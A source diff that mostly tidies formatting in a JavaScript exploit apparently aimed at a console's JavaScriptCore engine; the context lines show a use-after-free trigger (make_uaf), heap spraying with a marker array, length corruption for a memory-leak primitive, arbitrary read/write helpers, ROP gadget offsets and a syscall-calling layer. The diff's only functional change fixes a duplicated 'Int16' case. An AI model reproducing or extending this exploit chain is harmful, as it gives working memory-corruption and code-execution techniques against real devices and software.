@@ -112,7 +112,7 @@ class BigInt {
   valueOf () {
     var hi = this.hi()
     var lo = this.lo()
-    
+
     if (hi <= 0x1FFFFF) {
       return hi * 0x100000000 + lo
     }
@@ -191,7 +191,7 @@ class BigInt {
 
   eq (val) {
     val = val instanceof BigInt ? val : new BigInt(val)
-    
+
     return this.hi() === val.hi() && this.lo() === val.lo()
   }
 
@@ -230,7 +230,7 @@ class BigInt {
     }
 
     if (c !== 0) {
-      throw new Error('add overflowed !!');
+      throw new Error('add overflowed !!')
     }
 
     return ret
@@ -328,7 +328,7 @@ class BigInt {
 
   and (val) {
     val = val instanceof BigInt ? val : new BigInt(val)
-    
+
     var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
@@ -451,8 +451,8 @@ var struct = {
 
     var [sizeof, infos] = struct.parse(fields)
 
-    var cls = class {                    
-      constructor(addr) {
+    var cls = class {
+      constructor (addr) {
         this.addr = addr
       }
     }
@@ -469,7 +469,7 @@ var struct = {
   },
   unregister: function (name) {
     if (!(name in this)) {
-        throw new Error(`${name} not registered in struct !!`)
+      throw new Error(`${name} not registered in struct !!`)
     }
 
     delete this[name]
@@ -489,11 +489,11 @@ var struct = {
       var [, name, count] = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)
 
       if (type.includes('*')) {
-          size = 8
-          alignment = 8
-          pointer = true
+        size = 8
+        alignment = 8
+        pointer = true
       } else if (field.name in this) {
-        size = this[field.name].sizeof   
+        size = this[field.name].sizeof
       } else {
         var bits = type.replace(/\D/g, '')
         if (bits % 8 !== 0) {
@@ -504,22 +504,22 @@ var struct = {
         alignment = size
       }
 
-      if (size == 0) {
-          throw new Error(`Invalid size for ${field_name} !!`)
+      if (size === 0) {
+        throw new Error(`Invalid size for ${field_name} !!`)
       }
 
       count = count ? parseInt(count) : 1
 
       if (offset % alignment !== 0) {
-          offset += alignment - (offset % alignment)
+        offset += alignment - (offset % alignment)
       }
 
-      infos.push({type: type, name: name, offset: offset, size: size, count: count, pointer: pointer})
+      infos.push({ type, name, offset, size, count, pointer })
 
       offset += size * count
 
       if (alignment > struct_alignment) {
-          struct_alignment = alignment
+        struct_alignment = alignment
       }
     }
 
@@ -539,8 +539,8 @@ var struct = {
           }
 
           var arr
-          switch(info.type) {
-            case 'Int8': 
+          switch (info.type) {
+            case 'Int8':
               arr = new Int8Array(info.count)
               utils.set_backing(arr, addr)
               break
@@ -548,7 +548,7 @@ var struct = {
               arr = new Uint8Array(info.count)
               utils.set_backing(arr, addr)
               break
-            case 'Int16': 
+            case 'Int16':
               arr = new Int16Array(info.count)
               utils.set_backing(arr, addr)
               break
@@ -583,7 +583,7 @@ var struct = {
           return arr
         } else {
           var val = mem.read8(this.addr.add(info.offset))
-          switch(info.type) {
+          switch (info.type) {
             case 'Int8': return val.i8[0]
             case 'Uint8': return val.u8[0]
             case 'Int16': return val.i16[0]
@@ -596,7 +596,7 @@ var struct = {
               if (info.pointer) {
                 return val
               }
-                
+
               throw new Error(`Invalid type ${info.type}`)
           }
         }
@@ -610,7 +610,7 @@ var struct = {
           if (value.buffer.byteLength !== info.size * info.count) {
             throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
           }
-              
+
           var addr = this.addr.add(info.offset)
           if (info.type.includes('*')) {
             addr = mem.read8(addr)
@@ -622,8 +622,8 @@ var struct = {
           buf.set(value)
         } else {
           var temp = mem.read8(this.addr.add(info.offset))
-          switch(info.type) {
-            case 'Int8': 
+          switch (info.type) {
+            case 'Int8':
               temp.i8[0] = value
               break
             case 'Uint8':
@@ -632,7 +632,7 @@ var struct = {
             case 'Int16':
               temp.i16[0] = value
               break
-            case 'Int16':
+            case 'Uint16':
               temp.u16[0] = value
               break
             case 'Int32':
@@ -664,27 +664,27 @@ var struct = {
 }
 
 struct.register('NotificationRequest', [
-  {type: 'Int32', name: 'type'},
-  {type: 'Int32', name: 'reqId'},
-  {type: 'Int32', name: 'priority'},
-  {type: 'Int32', name: 'msg_id'},
-  {type: 'Int32', name: 'target_id'},
-  {type: 'Int32', name: 'user_id'},
-  {type: 'Int32', name: 'unk1'},
-  {type: 'Int32', name: 'unk2'},
-  {type: 'Int32', name: 'app_id'},
-  {type: 'Int32', name: 'error_num'},
-  {type: 'Int32', name: 'unk3'},
-  {type: 'Uint8', name: 'use_icon_image_uri'},
-  {type: 'Uint8', name: 'message[1024]'},
-  {type: 'Uint8', name: 'icon_uri[1024]'},
-  {type: 'Uint8', name: 'unk[1024]'},
+  { type: 'Int32', name: 'type' },
+  { type: 'Int32', name: 'reqId' },
+  { type: 'Int32', name: 'priority' },
+  { type: 'Int32', name: 'msg_id' },
+  { type: 'Int32', name: 'target_id' },
+  { type: 'Int32', name: 'user_id' },
+  { type: 'Int32', name: 'unk1' },
+  { type: 'Int32', name: 'unk2' },
+  { type: 'Int32', name: 'app_id' },
+  { type: 'Int32', name: 'error_num' },
+  { type: 'Int32', name: 'unk3' },
+  { type: 'Uint8', name: 'use_icon_image_uri' },
+  { type: 'Uint8', name: 'message[1024]' },
+  { type: 'Uint8', name: 'icon_uri[1024]' },
+  { type: 'Uint8', name: 'unk[1024]' },
 ])
 
 function make_uaf (arr) {
   var o = {}
-  for (var i in {xx: ''}) {
-    for (i of [arr]) {}
+  for (var i in { xx: '' }) {
+    for (i of [arr]);
     o[i]
   }
 }
@@ -722,11 +722,11 @@ log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
 var spray = new Array(0x800)
 for (var i = 0; i < spray.length; i++) {
-    spray[i] = [marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
+  spray[i] = [marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
 }
 
 log('Looking for marked array...')
-// find sprayed candidate by marker then corrupt its length 
+// find sprayed candidate by marker then corrupt its length
 for (var i = 0; i < uaf_arr.length; i += 2) {
   var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
   if (val.eq(marker)) {
@@ -947,10 +947,10 @@ var utils = {
     mem.allocs.set(backing, bytes)
     return backing
   },
-  get_backing: function(view) {
+  get_backing: function (view) {
     return mem.read8(mem.addrof(view).add(0x10))
   },
-  set_backing: function(view, addr) {
+  set_backing: function (view, addr) {
     return mem.write8(mem.addrof(view).add(0x10), addr)
   }
 }
@@ -1009,7 +1009,7 @@ var gadgets = {
   POP_RSP_RET: jsc_addr.add(0xC89EE),
   LEAVE_RET: jsc_addr.add(0x50C33),
   MOV_RAX_QWORD_PTR_RDI_RET: jsc_addr.add(0x36073),
-  MOV_QWORD_PTR_RDI_RAX_RET: jsc_addr.add(0x27FD0), 
+  MOV_QWORD_PTR_RDI_RAX_RET: jsc_addr.add(0x27FD0),
   MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40: jsc_addr.add(0x46E8F0),
   PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18: jsc_addr.add(0x3F6F70),
   MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: jsc_addr.add(0x18B3B5),
@@ -1151,7 +1151,7 @@ var fn = {
       id = new BigInt(input)
       addr = syscalls.map.get(input)
       syscall = true
-    } 
+    }
 
     var f = function () {
       if (arguments.length > 6) {
@@ -1222,18 +1222,18 @@ var fn = {
           }
         }
 
-        switch(ret) {
-            case 'bigint':
-              break
-            case 'boolean':
-              result = result.eq(BigInt.One)
-              break
-            case 'string':
-              result = utils.str(result)
-              break
-            default:
-              throw new Error(`Unsupported return type ${ret}`)
-          }
+        switch (ret) {
+          case 'bigint':
+            break
+          case 'boolean':
+            result = result.eq(BigInt.One)
+            break
+          case 'string':
+            result = utils.str(result)
+            break
+          default:
+            throw new Error(`Unsupported return type ${ret}`)
+        }
       }
 
       mem.free(store_addr)
@@ -1274,7 +1274,7 @@ var syscalls = {
   init: function (addr) {
     var offset = 0
     var count = 0x40000
-    
+
     var start_offset = 0
     var pattern_idx = 0
     while (offset < count) {
